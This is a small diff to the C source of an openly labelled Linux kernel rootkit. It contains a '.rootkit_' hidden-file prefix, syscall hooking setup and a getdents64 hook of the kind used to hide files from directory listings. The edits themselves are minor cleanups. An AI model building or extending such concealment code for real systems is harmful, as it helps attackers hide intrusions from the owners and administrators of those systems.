@@ -25,12 +25,12 @@ static const char S_HIDDEN_PREFIX[] = ".rootkit_";
 
 static int __init rootkit_init(void)
 {
-    int i_err = 0;
+    int i_err;
 
     // Initialize hooking
     i_err = init_hooking();
 
-    IF_U (i_err) {
+    IF_U (i_err != 0) {
         pr_err("[ROOTKIT] Failed to initialize hooking\n");
         return i_err;
     }
@@ -274,7 +274,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
         return l_ret_orig;
     }
 
-    p_dirent_k = (dirent64_t *)kzalloc(l_ret_orig, GFP_KERNEL);
+    p_dirent_k = kzalloc(l_ret_orig, GFP_KERNEL);
 
     IF_U (p_dirent_k == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
